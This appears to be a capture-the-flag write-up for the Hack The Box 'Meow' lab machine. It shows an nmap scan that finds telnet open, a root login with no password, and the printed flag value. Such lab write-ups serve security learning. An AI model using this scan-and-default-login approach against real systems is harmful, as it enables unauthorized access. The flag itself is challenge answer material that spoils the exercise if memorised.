With the given IP

10.129.237.91

What I'll do first is to scan it with nmap to see what ports are open and what services are running.

```bash
nmap -Pn 10.129.237.91
```

And we got the following response.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-30 20:46 -03
Nmap scan report for 10.129.237.91 (10.129.237.91)
Host is up (0.20s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
```

With this information we try to connect to the telnet service.

```bash
telnet 10.129.237.91 23
```

And like this we got access to the machine.

```bash
telnet 10.129.237.91 23
Trying 10.129.237.91...
Connected to 10.129.237.91.
Escape character is '^]'.


  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
Password: 

Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 30 Jan 2024 11:49:17 PM UTC

  System load:           0.08
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             135
  Users logged in:       0
  IPv4 address for eth0: 10.129.237.91
  IPv6 address for eth0: dead:beef::250:56ff:feb0:8423

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 
```

Now we just do a `ls` and there is a `flag.txt` file.
    
```
b40abdfe23665f766f9c61ecba8a4c19
```

And here we go! Machine is pwned! :D

https://www.hackthebox.com/achievement/machine/834305/394